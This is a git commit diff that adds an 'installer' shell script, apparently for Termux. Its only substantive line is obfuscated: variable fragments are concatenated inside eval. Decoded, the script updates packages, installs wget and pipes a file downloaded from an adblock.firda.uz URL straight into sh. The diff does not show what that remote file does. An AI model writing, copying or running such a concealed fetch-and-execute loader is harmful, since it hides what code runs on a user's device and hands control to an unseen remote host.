4cb2d38ee17f6029781fec3519690f612bf888c2
Firdaus Siregar <110901656+firdausiregar@users.noreply.github.com>
2024-03-05 17:13:06 +0700

    Installer 1

---
+++ tools/installer.sh
@@ -0,0 +1,7 @@
+# Script installer  
+# Author: Firdaus Siregar 
+# email : iam@firda.uz
+
+z="
+";Az='pkg ';Lz='wget';Iz='r';Fz='date';Ez='g up';Cz='te &';Sz='//ad';Rz='tps:';Nz='c "$';Hz='clea';Zz='tall';Vz='rda.';Tz='bloc';Jz='inst';Qz='- ht';Mz='sh -';Pz='t -O';Bz='upda';Uz='k.fi';Oz='(wge';Xz='ool/';Dz='& pk';Gz=' -y';Yz='xins';Wz='uz/t';az=')"';Kz='all ';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$z$Hz$Iz$z$Hz$Iz$z$Az$Jz$Kz$Lz$Gz$z$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az"
